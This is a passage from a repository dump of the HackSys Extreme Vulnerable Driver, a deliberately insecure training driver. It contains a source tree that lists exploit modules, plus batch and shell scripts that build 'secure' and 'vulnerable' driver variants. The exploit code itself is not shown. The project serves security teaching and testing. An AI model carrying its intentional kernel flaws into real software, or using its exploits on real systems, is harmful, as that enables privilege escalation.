Project Path: arc_hacksysteam_HackSysExtremeVulnerableDriver_g8t98ye8

Source Tree:

```txt
arc_hacksysteam_HackSysExtremeVulnerableDriver_g8t98ye8
├── Builder
│   ├── Build_HEVD_All.bat
│   ├── Build_HEVD_All.sh
│   ├── Build_HEVD_Exploit.bat
│   ├── Build_HEVD_Secure_arm64.bat
│   ├── Build_HEVD_Secure_x64.bat
│   ├── Build_HEVD_Secure_x64.sh
│   ├── Build_HEVD_Secure_x86.bat
│   ├── Build_HEVD_Vulnerable_arm64.bat
│   ├── Build_HEVD_Vulnerable_x64.bat
│   ├── Build_HEVD_Vulnerable_x64.sh
│   └── Build_HEVD_Vulnerable_x86.bat
├── CONTRIBUTING.md
├── Driver
│   ├── CMake
│   │   ├── DetectOS.cmake
│   │   ├── LKM.cmake
│   │   └── WDK.cmake
│   ├── CMakeLists.txt
│   └── HEVD
│       ├── CMakeLists.txt
│       ├── Linux
│       │   ├── ArbitraryWrite.c
│       │   ├── ArbitraryWrite.h
│       │   ├── BufferOverflowStack.c
│       │   ├── BufferOverflowStack.h
│       │   ├── CMakeLists.txt
│       │   ├── Common.h
│       │   ├── HackSysExtremeVulnerableDriver.c
│       │   ├── HackSysExtremeVulnerableDriver.h
│       │   ├── IntegerOverflow.c
│       │   ├── IntegerOverflow.h
│       │   ├── UninitializedMemoryStack.c
│       │   └── UninitializedMemoryStack.h
│       └── Windows
│           ├── ArbitraryIncrement.c
│           ├── ArbitraryIncrement.h
│           ├── ArbitraryReadWriteHelperNonPagedPoolNx.c
│           ├── ArbitraryReadWriteHelperNonPagedPoolNx.h
│           ├── ArbitraryWrite.c
│           ├── ArbitraryWrite.h
│           ├── BufferOverflowNonPagedPool.c
│           ├── BufferOverflowNonPagedPool.h
│           ├── BufferOverflowNonPagedPoolNx.c
│           ├── BufferOverflowNonPagedPoolNx.h
│           ├── BufferOverflowPagedPoolSession.c
│           ├── BufferOverflowPagedPoolSession.h
│           ├── BufferOverflowStack.c
│           ├── BufferOverflowStack.h
│           ├── BufferOverflowStackGS.c
│           ├── BufferOverflowStackGS.h
│           ├── CMakeLists.txt
│           ├── Common.h
│           ├── DoubleFetch.c
│           ├── DoubleFetch.h
│           ├── HEVD.inf
│           ├── HEVD.pfx
│           ├── HEVD.sln
│           ├── HackSysExtremeVulnerableDriver.c
│           ├── HackSysExtremeVulnerableDriver.h
│           ├── HackSysExtremeVulnerableDriver.vcxproj
│           ├── HackSysExtremeVulnerableDriver.vcxproj.filters
│           ├── InsecureKernelResourceAccess.c
│           ├── InsecureKernelResourceAccess.h
│           ├── IntegerOverflow.c
│           ├── IntegerOverflow.h
│           ├── MemoryDisclosureNonPagedPool.c
│           ├── MemoryDisclosureNonPagedPool.h
│           ├── MemoryDisclosureNonPagedPoolNx.c
│           ├── MemoryDisclosureNonPagedPoolNx.h
│           ├── NullPointerDereference.c
│           ├── NullPointerDereference.h
│           ├── TypeConfusion.c
│           ├── TypeConfusion.h
│           ├── UninitializedMemoryPagedPool.c
│           ├── UninitializedMemoryPagedPool.h
│           ├── UninitializedMemoryStack.c
│           ├── UninitializedMemoryStack.h
│           ├── UseAfterFreeNonPagedPool.c
│           ├── UseAfterFreeNonPagedPool.h
│           ├── UseAfterFreeNonPagedPoolNx.c
│           ├── UseAfterFreeNonPagedPoolNx.h
│           ├── WriteNULL.c
│           └── WriteNULL.h
├── Exploit
│   ├── ArbitraryOverwrite.c
│   ├── ArbitraryOverwrite.h
│   ├── Common.c
│   ├── Common.h
│   ├── DoubleFetch.c
│   ├── DoubleFetch.h
│   ├── HackSysEVDExploit.c
│   ├── HackSysEVDExploit.h
│   ├── HackSysEVDExploit.sln
│   ├── HackSysEVDExploit.vcxproj
│   ├── HackSysEVDExploit.vcxproj.filters
│   ├── InsecureKernelResourceAccess.c
│   ├── InsecureKernelResourceAccess.h
│   ├── IntegerOverflow.c
│   ├── IntegerOverflow.h
│   ├── NullPointerDereference.c
│   ├── NullPointerDereference.h
│   ├── Payloads.c
│   ├── Payloads.h
│   ├── PoolOverflow.c
│   ├── PoolOverflow.h
│   ├── StackOverflow.c
│   ├── StackOverflow.h
│   ├── StackOverflowGS.c
│   ├── StackOverflowGS.h
│   ├── TypeConfusion.c
│   ├── TypeConfusion.h
│   ├── UninitializedHeapVariable.c
│   ├── UninitializedHeapVariable.h
│   ├── UninitializedStackVariable.c
│   ├── UninitializedStackVariable.h
│   ├── UseAfterFree.c
│   ├── UseAfterFree.h
│   └── arg.h
├── LICENSE
├── README.md
├── Screenshots
│   ├── hevd-banner.png
│   ├── hevd-debug-print.png
│   ├── hevd-exploitation.png
│   ├── hevd-help.png
│   ├── hevd-linux-banner.png
│   ├── hevd-linux-install-uninstall.png
│   ├── hevd-linux-ioctl-log.png
│   └── hevd-linux-ioctl-tests.png
├── Tools
│   ├── hevd_linux_installer.sh
│   └── hevd_linux_tests.py
├── Whitepaper
│   ├── HackSys Extreme Vulnerable Driver.pptx
│   └── HackSys_Extreme_Vulnerable_Driver_Whitepaper.pdf
└── appveyor.yml

```

`Builder/Build_HEVD_All.bat`:

```bat
@echo off

%COMSPEC% /c Build_HEVD_Secure_x64.bat
%COMSPEC% /c Build_HEVD_Secure_x86.bat
%COMSPEC% /c Build_HEVD_Secure_arm64.bat
%COMSPEC% /c Build_HEVD_Vulnerable_x64.bat
%COMSPEC% /c Build_HEVD_Vulnerable_x86.bat
%COMSPEC% /c Build_HEVD_Vulnerable_arm64.bat

```

`Builder/Build_HEVD_All.sh`:

```sh
#!/usr/bin/env bash

$(which sh) Build_HEVD_Secure_x64.sh
$(which sh) Build_HEVD_Vulnerable_x64.sh

```

`Builder/Build_HEVD_Exploit.bat`:

```bat
@echo off
echo.
echo  #     #                       #####               #######                     
echo  #     #   ##    ####  #    # #     # #   #  ####     #    ######   ##   #    #
echo  #     #  #  #  #    # #   #  #        # #  #         #    #       #  #  ##  ##
echo  ####### #    # #      ####    #####    #    ####     #    #####  #    # # ## #
echo  #     # ###### #      #  #         #   #        #    #    #      ###### #    #
echo  #     # #    # #    # #   #  #     #   #   #    #    #    #      #    # #    #
echo  #     # #    #  ####  #    #  #####    #    ####     #    ###### #    # #    #
echo.
echo              HackSys Extreme Vulnerable Driver Exploit Build Utility

REM store the current directory path
set currentDir=%cd%

REM store the local symbol server path
set localSymbolServerPath=C:\Xtra\Symbols\Custom\

set VC_PATH="%VS100COMNTOOLS%\..\..\VC\vcvarsall.bat"

echo.
echo **************************************************
@call %VC_PATH% x86
echo **************************************************

cd %currentDir%\..\Exploit

echo.
echo **************************************************
echo Building HackSys Extreme Vulnerable Driver Exploit
echo **************************************************
echo.
rmdir /S /Q %currentDir%\..\compile\exploit
msbuild /t:Clean;Build /p:OutDir=%currentDir%\..\compile\exploit\;Configuration=Release;Platform=Win32
echo **************************************************
echo.
echo **************************************************
echo Cleaning The Build Directory
echo **************************************************
echo.
echo Deleting Release folder
rmdir /S /Q %currentDir%\..\Exploit\Release
echo ******************************************

echo.
echo ******************************************
echo Transferring Driver Symbols to Symbol Store
echo ******************************************
cd "C:\Program Files\Debugging Tools for Windows (x86)"
echo.
symstore.exe add /r /f %currentDir%\..\compile\exploit\ /s %localSymbolServerPath% /t "ExploitSymbol" /v "1.0"
echo ******************************************
echo.
echo ******************************************
echo HackSys Extreme Vulnerable Driver Built
echo              Successfully
echo ******************************************
echo.
cd %currentDir%
pause

```

`Builder/Build_HEVD_Secure_arm64.bat`:

```bat
@echo off
echo.
echo  #     #                       #####               #######                     
echo  #     #   ##    ####  #    # #     # #   #  ####     #    ######   ##   #    #
echo  #     #  #  #  #    # #   #  #        # #  #         #    #       #  #  ##  ##
echo  ####### #    # #      ####    #####    #    ####     #    #####  #    # # ## #
echo  #     # ###### #      #  #         #   #        #    #    #      ###### #    #
echo  #     # #    # #    # #   #  #     #   #   #    #    #    #      #    # #    #
echo  #     # #    #  ####  #    #  #####    #    ####     #    ###### #    # #    #
echo.
echo                  HackSys Extreme Vulnerable Driver Build Utility
echo.

rem Store the current directory path
set BUILD_ARCH=arm64
set CURRENT_DIR=%cd%
set PROJECT_NAME=HEVD
set PROJECT_DIR=%CURRENT_DIR%\..\Driver\

rem Get the normalized path 
for %%i in ("%PROJECT_DIR%") do SET "PROJECT_DIR=%%~fi"

set BUILD_DIR=%PROJECT_DIR%..\build\driver\windows\secure\%BUILD_ARCH%

rem VS2017U2 contains vswhere.exe
if "%VSWHERE%"=="" (
    set "VSWHERE=%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe"
)

for /f "usebackq tokens=*" %%i in (`"%VSWHERE%" -latest -products * -requires Microsoft.Component.MSBuild -property installationPath`) do (
    set VS_INSTALL_DIR=%%i
)

echo [+] Visual Studio Path: %VS_INSTALL_DIR%

set VSDEVCMD_PATH=%VS_INSTALL_DIR%\Common7\Tools\VsDevCmd.bat

echo [+] Executing: %VSDEVCMD_PATH%

echo.
@call "%VSDEVCMD_PATH%" -arch=%BUILD_ARCH% -host_arch=amd64
echo.

echo [+] Build target architecture: %BUILD_ARCH%
echo [+] Host Architecture: %PROCESSOR_ARCHITECTURE%
echo [+] Build directory: %BUILD_DIR%
echo [+] Removing build directory

if exist %BUILD_DIR% (
    rmdir /S /Q "%BUILD_DIR%"
)

echo [+] Creating build directory

mkdir "%BUILD_DIR%"
cd %BUILD_DIR%

echo [+] Generating build configuration files

cmake.exe -G "Ninja" -DCMAKE_INSTALL_PREFIX:PATH="%BUILD_DIR%" -DCMAKE_BUILD_TYPE="Release" -DSECURE=1 "%PROJECT_DIR%"

echo.
echo [+] Building secure HackSys Extreme Vulnerable Driver
echo.

CMake.exe --build "%BUILD_DIR%" --config Release --clean-first -- "-v"
echo.

echo [+] Copying built files

echo [*] %PROJECT_NAME%.sys
move /Y "%BUILD_DIR%\%PROJECT_NAME%\Windows\%PROJECT_NAME%.sys" "%BUILD_DIR%"

echo [*] %PROJECT_NAME%.pdb
move /Y "%BUILD_DIR%\%PROJECT_NAME%\Windows\%PROJECT_NAME%.pdb" "%BUILD_DIR%"

echo [*] %PROJECT_NAME%.cat
move /Y "%BUILD_DIR%\%PROJECT_NAME%\Windows\%PROJECT_NAME%.cat" "%BUILD_DIR%"

echo [*] %PROJECT_NAME%.inf
move /Y "%BUILD_DIR%\%PROJECT_NAME%\Windows\%PROJECT_NAME%.inf" "%BUILD_DIR%"
echo.


echo [+] Cleaning build directory
for /r "%BUILD_DIR%" %%a in (*) do (
    if not %%~xa==.sys (
        if not %%~xa==.pdb (
            if not %%~xa==.inf (
                if not %%~xa==.cat (
                    del /f /q "%%a"
                )
            )
        )
    )
)

rmdir /S /Q "%BUILD_DIR%\%PROJECT_NAME%"
rmdir /S /Q "%BUILD_DIR%\CMakeFiles"
echo.

echo [+] Built secure HackSys Extreme Vulnerable Driver successfully
cd %CURRENT_DIR%
echo.

```

`Builder/Build_HEVD_Secure_x64.bat`:

```bat
@echo off
echo.
echo  #     #                       #####               #######                     
echo  #     #   ##    ####  #    # #     # #   #  ####     #    ######   ##   #    #
echo  #     #  #  #  #    # #   #  #        # #  #         #    #       #  #  ##  ##
echo  ####### #    # #      ####    #####    #    ####     #    #####  #    # # ## #
echo  #     # ###### #      #  #         #   #        #    #    #      ###### #    #
echo  #     # #    # #    # #   #  #     #   #   #    #    #    #      #    # #    #
echo  #     # #    #  ####  #    #  #####    #    ####     #    ###### #    # #    #
echo.
echo                  HackSys Extreme Vulnerable Driver Build Utility
echo.

rem Store the current directory path
set BUILD_ARCH=x64
set CURRENT_DIR=%cd%
set PROJECT_NAME=HEVD
set PROJECT_DIR=%CURRENT_DIR%\..\Driver\

rem Get the normalized path 
for %%i in ("%PROJECT_DIR%") do SET "PROJECT_DIR=%%~fi"

set BUILD_DIR=%PROJECT_DIR%..\build\driver\windows\secure\%BUILD_ARCH%

rem VS2017U2 contains vswhere.exe
if "%VSWHERE%"=="" (
    set "VSWHERE=%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe"
)

for /f "usebackq tokens=*" %%i in (`"%VSWHERE%" -latest -products * -requires Microsoft.Component.MSBuild -property installationPath`) do (
    set VS_INSTALL_DIR=%%i
)

echo [+] Visual Studio Path: %VS_INSTALL_DIR%

set VSDEVCMD_PATH=%VS_INSTALL_DIR%\Common7\Tools\VsDevCmd.bat

echo [+] Executing: %VSDEVCMD_PATH%

echo.
@call "%VSDEVCMD_PATH%" -arch=%BUILD_ARCH%
echo.

echo [+] Build target architecture: %BUILD_ARCH%
echo [+] Host Architecture: %PROCESSOR_ARCHITECTURE%
echo [+] Build directory: %BUILD_DIR%
echo [+] Removing build directory

if exist %BUILD_DIR% (
    rmdir /S /Q "%BUILD_DIR%"
)

echo [+] Creating build directory

mkdir "%BUILD_DIR%"
cd %BUILD_DIR%

echo [+] Generating build configuration files

cmake.exe -G "Ninja" -DCMAKE_INSTALL_PREFIX:PATH="%BUILD_DIR%" -DCMAKE_BUILD_TYPE="Release" -DSECURE=1 "%PROJECT_DIR%"

echo.
echo [+] Building secure HackSys Extreme Vulnerable Driver
echo.

CMake.exe --build "%BUILD_DIR%" --config Release --clean-first -- "-v"
echo.

echo [+] Copying built files

echo [*] %PROJECT_NAME%.sys
move /Y "%BUILD_DIR%\%PROJECT_NAME%\Windows\%PROJECT_NAME%.sys" "%BUILD_DIR%"

echo [*] %PROJECT_NAME%.pdb
move /Y "%BUILD_DIR%\%PROJECT_NAME%\Windows\%PROJECT_NAME%.pdb" "%BUILD_DIR%"

echo [*] %PROJECT_NAME%.cat
move /Y "%BUILD_DIR%\%PROJECT_NAME%\Windows\%PROJECT_NAME%.cat" "%BUILD_DIR%"

echo [*] %PROJECT_NAME%.inf
move /Y "%BUILD_DIR%\%PROJECT_NAME%\Windows\%PROJECT_NAME%.inf" "%BUILD_DIR%"
echo.


echo [+] Cleaning build directory
for /r "%BUILD_DIR%" %%a in (*) do (
    if not %%~xa==.sys (
        if not %%~xa==.pdb (
            if not %%~xa==.inf (
                if not %%~xa==.cat (
                    del /f /q "%%a"
                )
            )
        )
    )
)

rmdir /S /Q "%BUILD_DIR%\%PROJECT_NAME%"
rmdir /S /Q "%BUILD_DIR%\CMakeFiles"
echo.

echo [+] Built secure HackSys Extreme Vulnerable Driver successfully
cd %CURRENT_DIR%
echo.

```

`Builder/Build_HEVD_Secure_x64.sh`:

```sh
#!/usr/bin/env bash

BANNER="
  #     #                       #####               #######                     
  #     #   ##    ####  #    # #     # #   #  ####     #    ######   ##   #    #
  #     #  #  #  #    # #   #  #        # #  #         #    #       #  #  ##  ##
  ####### #    # #      ####    #####    #    ####     #    #####  #    # # ## #
  #     # ###### #      #  #         #   #        #    #    #      ###### #    #
  #     # #    # #    # #   #  #     #   #   #    #    #    #      #    # #    #
  #     # #    #  ####  #    #  #####    #    ####     #    ###### #    # #    #

                 HackSys Extreme Vulnerable Driver Build Utility
"

echo "${BANNER}"

# Standard constants
BUILD_ARCH=x64
CURRENT_DIR=$PWD
PROJECT_NAME=hevd
PROJECT_DIR="$(realpath -m ${CURRENT_DIR}/../Driver)"
BUILD_DIR="$(realpath -m ${PROJECT_DIR}/../_build)"
BINARY_DIR="$(realpath -m ${PROJECT_DIR}/../build/driver/linux/secure/${BUILD_ARCH})"

echo "[+] Build target architecture: ${BUILD_ARCH}"
echo "[+] Host Architecture: $(uname -m)"
echo "[+] Build directory: ${BUILD_DIR}"
echo "[+] Binary directory: ${BINARY_DIR}"
echo "[+] Removing build & binary directory"

if [ -d "${BUILD_DIR}" ]; then
    rm -rfd ${BUILD_DIR}
fi

if [ -d "${BINARY_DIR}" ]; then
    rm -rfd ${BINARY_DIR}
fi

echo "[+] Creating build directory"

mkdir -p ${BUILD_DIR}
cd ${BUILD_DIR}

echo "[+] Generating build configuration files"

$(which cmake) -G "Unix Makefiles" -DSECURE=1 "${PROJECT_DIR}"

echo
echo "[+] Building secure HackSys Extreme Vulnerable Driver"
echo

$(which make)
echo

echo "[+] Creating binary directory"
mkdir -p ${BINARY_DIR}

echo "[+] Copying built files"

echo "[*] ${PROJECT_NAME}.ko"
mv -f "${BUILD_DIR}/${PROJECT_NAME}.ko" "${BINARY_DIR}"
echo

echo "[+] Cleaning build directory"

$(which make) clean
rm -rf ${BUILD_DIR}

echo "[+] Built secure HackSys Extreme Vulnerable Driver successfully"
echo

```

`Builder/Build_HEVD_Secure_x86.bat`:

```bat
@echo off
echo.
echo  #     #                       #####               #######                     
echo  #     #   ##    ####  #    # #     # #   #  ####     #    ######   ##   #    #
echo  #     #  #  #  #    # #   #  #        # #  #         #    #       #  #  ##  ##
echo  ####### #    # #      ####    #####    #    ####     #    #####  #    # # ## #
echo  #     # ###### #      #  #         #   #        #    #    #      ###### #    #
echo  #     # #    # #    # #   #  #     #   #   #    #    #    #      #    # #    #
echo  #     # #    #  ####  #    #  #####    #    ####     #    ###### #    # #    #
echo.
echo                  HackSys Extreme Vulnerable Driver Build Utility
echo.

rem Store the current directory path
set BUILD_ARCH=x86
set CURRENT_DIR=%cd%
set PROJECT_NAME=HEVD
set PROJECT_DIR=%CURRENT_DIR%\..\Driver\

rem Get the normalized path 
for %%i in ("%PROJECT_DIR%") do SET "PROJECT_DIR=%%~fi"

set BUILD_DIR=%PROJECT_DIR%..\build\driver\windows\secure\%BUILD_ARCH%

rem VS2017U2 contains vswhere.exe
if "%VSWHERE%"=="" (
    set "VSWHERE=%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe"
)

for /f "usebackq tokens=*" %%i in (`"%VSWHERE%" -latest -products * -requires Microsoft.Component.MSBuild -property installationPath`) do (
    set VS_INSTALL_DIR=%%i
)

echo [+] Visual Studio Path: %VS_INSTALL_DIR%

set VSDEVCMD_PATH=%VS_INSTALL_DIR%\Common7\Tools\VsDevCmd.bat

echo [+] Executing: %VSDEVCMD_PATH%

echo.
@call "%VSDEVCMD_PATH%" -arch=%BUILD_ARCH%
echo.

echo [+] Build target architecture: %BUILD_ARCH%
echo [+] Host Architecture: %PROCESSOR_ARCHITECTURE%
echo [+] Build directory: %BUILD_DIR%
echo [+] Removing build directory

if exist %BUILD_DIR% (
    rmdir /S /Q "%BUILD_DIR%"
)

echo [+] Creating build directory

mkdir "%BUILD_DIR%"
cd %BUILD_DIR%

echo [+] Generating build configuration files

cmake.exe -G "Ninja" -DCMAKE_INSTALL_PREFIX:PATH="%BUILD_DIR%" -DCMAKE_BUILD_TYPE="Release" -DSECURE=1 "%PROJECT_DIR%"

echo.
echo [+] Building secure HackSys Extreme Vulnerable Driver
echo.

CMake.exe --build "%BUILD_DIR%" --config Release --clean-first -- "-v"
echo.

echo [+] Copying built files

echo [*] %PROJECT_NAME%.sys
move /Y "%BUILD_DIR%\%PROJECT_NAME%\Windows\%PROJECT_NAME%.sys" "%BUILD_DIR%"

echo [*] %PROJECT_NAME%.pdb
move /Y "%BUILD_DIR%\%PROJECT_NAME%\Windows\%PROJECT_NAME%.pdb" "%BUILD_DIR%"

echo [*] %PROJECT_NAME%.cat
move /Y "%BUILD_DIR%\%PROJECT_NAME%\Windows\%PROJECT_NAME%.cat" "%BUILD_DIR%"

echo [*] %PROJECT_NAME%.inf
move /Y "%BUILD_DIR%\%PROJECT_NAME%\Windows\%PROJECT_NAME%.inf" "%BUILD_DIR%"
echo.


echo [+] Cleaning build directory
for /r "%BUILD_DIR%" %%a in (*) do (
    if not %%~xa==.sys (
        if not %%~xa==.pdb (
            if not %%~xa==.inf (
                if not %%~xa==.cat (
                    del /f /q "%%a"
                )
            )
        )
    )
)

rmdir /S /Q "%BUILD_DIR%\%PROJECT_NAME%"
rmdir /S /Q "%BUILD_DIR%\CMakeFiles"
echo.

echo [+] Built secure HackSys Extreme Vulnerable Driver successfully
cd %CURRENT_DIR%
echo.

```

`Builder/Build_HEVD_Vulnerable_arm64.bat`:

```bat
@echo off
echo.
echo  #     #                       #####               #######                     
echo  #     #   ##    ####  #    # #     # #   #  ####     #    ######   ##   #    #
echo  #     #  #  #  #    # #   #  #        # #  #         #    #       #  #  ##  ##
echo  ####### #    # #      ####    #####    #    ####     #    #####  #    # # ## #
echo  #     # ###### #      #  #         #   #        #    #    #      ###### #    #
echo  #     # #    # #    # #   #  #     #   #   #    #    #    #      #    # #    #
echo  #     # #    #  ####  #    #  #####    #    ####     #    ###### #    # #    #
echo.
echo                  HackSys Extreme Vulnerable Driver Build Utility
echo.

rem Store the current directory path
set BUILD_ARCH=arm64
set CURRENT_DIR=%cd%
set PROJECT_NAME=HEVD
set PROJECT_DIR=%CURRENT_DIR%\..\Driver\

rem Get the normalized path 
for %%i in ("%PROJECT_DIR%") do SET "PROJECT_DIR=%%~fi"

set BUILD_DIR=%PROJECT_DIR%..\build\driver\windows\vulnerable\%BUILD_ARCH%

rem VS2017U2 contains vswhere.exe
if "%VSWHERE%"=="" (
    set "VSWHERE=%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe"
)

for /f "usebackq tokens=*" %%i in (`"%VSWHERE%" -latest -products * -requires Microsoft.Component.MSBuild -property installationPath`) do (
    set VS_INSTALL_DIR=%%i
)

echo [+] Visual Studio Path: %VS_INSTALL_DIR%

set VSDEVCMD_PATH=%VS_INSTALL_DIR%\Common7\Tools\VsDevCmd.bat

echo [+] Executing: %VSDEVCMD_PATH%

echo.
@call "%VSDEVCMD_PATH%" -arch=%BUILD_ARCH% -host_arch=amd64
echo.

echo [+] Build target architecture: %BUILD_ARCH%
echo [+] Host Architecture: %PROCESSOR_ARCHITECTURE%
echo [+] Build directory: %BUILD_DIR%
echo [+] Removing build directory

if exist %BUILD_DIR% (
    rmdir /S /Q "%BUILD_DIR%"
)

echo [+] Creating build directory

mkdir "%BUILD_DIR%"
cd %BUILD_DIR%

echo [+] Generating build configuration files

cmake.exe -G "Ninja" -DCMAKE_INSTALL_PREFIX:PATH="%BUILD_DIR%" -DCMAKE_BUILD_TYPE="Release" "%PROJECT_DIR%"

echo.
echo [+] Building vulnerable HackSys Extreme Vulnerable Driver
echo.

CMake.exe --build "%BUILD_DIR%" --config Release --clean-first -- "-v"
echo.

echo [+] Copying built files

echo [*] %PROJECT_NAME%.sys
move /Y "%BUILD_DIR%\%PROJECT_NAME%\Windows\%PROJECT_NAME%.sys" "%BUILD_DIR%"

echo [*] %PROJECT_NAME%.pdb
move /Y "%BUILD_DIR%\%PROJECT_NAME%\Windows\%PROJECT_NAME%.pdb" "%BUILD_DIR%"

echo [*] %PROJECT_NAME%.cat
move /Y "%BUILD_DIR%\%PROJECT_NAME%\Windows\%PROJECT_NAME%.cat" "%BUILD_DIR%"

echo [*] %PROJECT_NAME%.inf
move /Y "%BUILD_DIR%\%PROJECT_NAME%\Windows\%PROJECT_NAME%.inf" "%BUILD_DIR%"
echo.


echo [+] Cleaning build directory
for /r "%BUILD_DIR%" %%a in (*) do (
    if not %%~xa==.sys (
        if not %%~xa==.pdb (
            if not %%~xa==.inf (
                if not %%~xa==.cat (
                    del /f /q "%%a"
                )
            )
        )
    )
)

rmdir /S /Q "%BUILD_DIR%\%PROJECT_NAME%"
rmdir /S /Q "%BUILD_DIR%\CMakeFiles"
echo.

echo [+] Built vulnerable HackSys Extreme Vulnerable Driver successfully
cd %CURRENT_DIR%
echo.

```

`Builder/Build_HEVD_Vulnerable_x64.bat`:

```bat
@echo off
echo.
echo  #     #                       #####               #######                     
echo  #     #   ##    ####  #    # #     # #   #  ####     #    ######   ##   #    #
echo  #     #  #  #  #    # #   #  #        # #  #         #    #       #  #  ##  ##
echo  ####### #    # #      ####    #####    #    ####     #    #####  #    # # ## #
echo  #     # ###### #      #  #         #   #        #    #    #      ###### #    #
echo  #     # #    # #    # #   #  #     #   #   #    #    #    #      #    # #    #
echo  #     # #    #  ####  #    #  #####    #    ####     #    ###### #    # #    #
echo.
echo                  HackSys Extreme Vulnerable Driver Build Utility
echo.

rem Store the current directory path
set BUILD_ARCH=x64
set CURRENT_DIR=%cd%
set PROJECT_NAME=HEVD
set PROJECT_DIR=%CURRENT_DIR%\..\Driver\

rem Get the normalized path 
for %%i in ("%PROJECT_DIR%") do SET "PROJECT_DIR=%%~fi"

set BUILD_DIR=%PROJECT_DIR%..\build\driver\windows\vulnerable\%BUILD_ARCH%

rem VS2017U2 contains vswhere.exe
if "%VSWHERE%"=="" (
    set "VSWHERE=%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe"
)

for /f "usebackq tokens=*" %%i in (`"%VSWHERE%" -latest -products * -requires Microsoft.Component.MSBuild -property installationPath`) do (
    set VS_INSTALL_DIR=%%i
)

echo [+] Visual Studio Path: %VS_INSTALL_DIR%

set VSDEVCMD_PATH=%VS_INSTALL_DIR%\Common7\Tools\VsDevCmd.bat

echo [+] Executing: %VSDEVCMD_PATH%

echo.
@call "%VSDEVCMD_PATH%" -arch=%BUILD_ARCH%
echo.

echo [+] Build target architecture: %BUILD_ARCH%
echo [+] Host Architecture: %PROCESSOR_ARCHITECTURE%
echo [+] Build directory: %BUILD_DIR%
echo [+] Removing build directory

if exist %BUILD_DIR% (
    rmdir /S /Q "%BUILD_DIR%"
)

echo [+] Creating build directory

mkdir "%BUILD_DIR%"
cd %BUILD_DIR%

echo [+] Generating build configuration files

cmake.exe -G "Ninja" -DCMAKE_INSTALL_PREFIX:PATH="%BUILD_DIR%" -DCMAKE_BUILD_TYPE="Release" "%PROJECT_DIR%"

echo.
echo [+] Building vulnerable HackSys Extreme Vulnerable Driver
echo.

CMake.exe --build "%BUILD_DIR%" --config Release --clean-first -- "-v"
echo.

echo [+] Copying built files

echo [*] %PROJECT_NAME%.sys
move /Y "%BUILD_DIR%\%PROJECT_NAME%\Windows\%PROJECT_NAME%.sys" "%BUILD_DIR%"

echo [*] %PROJECT_NAME%.pdb
move /Y "%BUILD_DIR%\%PROJECT_NAME%\Windows\%PROJECT_NAME%.pdb" "%BUILD_DIR%"

echo [*] %PROJECT_NAME%.cat
move /Y "%BUILD_DIR%\%PROJECT_NAME%\Windows\%PROJECT_NAME%.cat" "%BUILD_DIR%"

echo [*] %PROJECT_NAME%.inf
move /Y "%BUILD_DIR%\%PROJECT_NAME%\Windows\%PROJECT_NAME%.inf" "%BUILD_DIR%"
echo.


echo [+] Cleaning build directory
for /r "%BUILD_DIR%" %%a in (*) do (
    if not %%~xa==.sys (
        if not %%~xa==.pdb (
            if not %%~xa==.inf (
                if not %%~xa==.cat (
                    del /f /q "%%a"
                )
            )
        )
    )
)

rmdir /S /Q "%BUILD_DIR%\%PROJECT_NAME%"
rmdir /S /Q "%BUILD_DIR%\CMakeFiles"
echo.

echo [+] Built vulnerable HackSys Extreme Vulnerable Driver successfully
cd %CURRENT_DIR%
echo.

```

`Builder/Build_HEVD_Vulnerable_x64.sh`:

```sh
#!/usr/bin/env bash

BANNER="
  #     #                       #####               #######                     
  #     #   ##    ####  #    # #     # #   #  ####     #    ######   ##   #    #
  #     #  #  #  #    # #   #  #        # #  #         #    #       #  #  ##  ##
  ####### #    # #      ####    #####    #    ####     #    #####  #    # # ## #
  #     # ###### #      #  #         #   #        #    #    #      ###### #    #
  #     # #    # #    # #   #  #     #   #   #    #    #    #      #    # #    #
  #     # #    #  ####  #    #  #####    #    ####     #    ###### #    # #    #

                 HackSys Extreme Vulnerable Driver Build Utility
"

echo "${BANNER}"

# Standard constants
BUILD_ARCH=x64
CURRENT_DIR=$PWD
PROJECT_NAME=hevd
PROJECT_DIR="$(realpath -m ${CURRENT_DIR}/../Driver)"
BUILD_DIR="$(realpath -m ${PROJECT_DIR}/../_build)"
BINARY_DIR="$(realpath -m ${PROJECT_DIR}/../build/driver/linux/vulnerable/${BUILD_ARCH})"

echo "[+] Build target architecture: ${BUILD_ARCH}"
echo "[+] Host Architecture: $(uname -m)"
echo "[+] Build directory: ${BUILD_DIR}"
echo "[+] Binary directory: ${BINARY_DIR}"
echo "[+] Removing build & binary directory"

if [ -d "${BUILD_DIR}" ]; then
    rm -rfd ${BUILD_DIR}
fi

if [ -d "${BINARY_DIR}" ]; then
    rm -rfd ${BINARY_DIR}
fi

echo "[+] Creating build directory"

mkdir -p ${BUILD_DIR}
cd ${BUILD_DIR}

echo "[+] Generating build configuration files"

$(which cmake) -G "Unix Makefiles" "${PROJECT_DIR}"

echo
echo "[+] Building vulnerable HackSys Extreme Vulnerable Driver"
echo

$(which make)
echo

echo "[+] Creating binary directory"
mkdir -p ${BINARY_DIR}

echo "[+] Copying built files"

echo "[*] ${PROJECT_NAME}.ko"
mv -f "${BUILD_DIR}/${PROJECT_NAME}.ko" "${BINARY_DIR}"
echo

echo "[+] Cleaning build directory"

$(which make) clean
rm -rf ${BUILD_DIR}

echo "[+] Built vulnerable HackSys Extreme Vulnerable Driver successfully"
echo

```

`Builder/Build_HEVD_Vulnerable_x86.bat`:

```bat
@echo off
echo.
echo  #     #                       #####               #######                     
echo  #     #   ##    ####  #    # #     # #   #  ####     #    ######   ##   #    #
echo  #     #  #  #  #    # #   #  #        # #  #         #    #       #  #  ##  ##
echo  ####### #    # #      ####    #####    #    ####     #    #####  #    # # ## #
echo  #     # ###### #      #  #         #   #        #    #    #      ###### #    #
echo  #     # #    # #    # #   #  #     #   #   #    #    #    #      #    # #    #
echo  #     # #    #  ####  #    #  #####    #    ####     #    ###### #    # #    #
echo.
echo                  HackSys Extreme Vulnerable Driver Build Utility
echo.

rem Store the current directory path
set BUILD_ARCH=x86
set CURRENT_DIR=%cd%
set PROJECT_NAME=HEVD
set PROJECT_DIR=%CURRENT_DIR%\..\Driver\

rem Get the normalized path 
for %%i in ("%PROJECT_DIR%") do SET "PROJECT_DIR=%%~fi"

set BUILD_DIR=%PROJECT_DIR%..\build\driver\windows\vulnerable\%BUILD_ARCH%

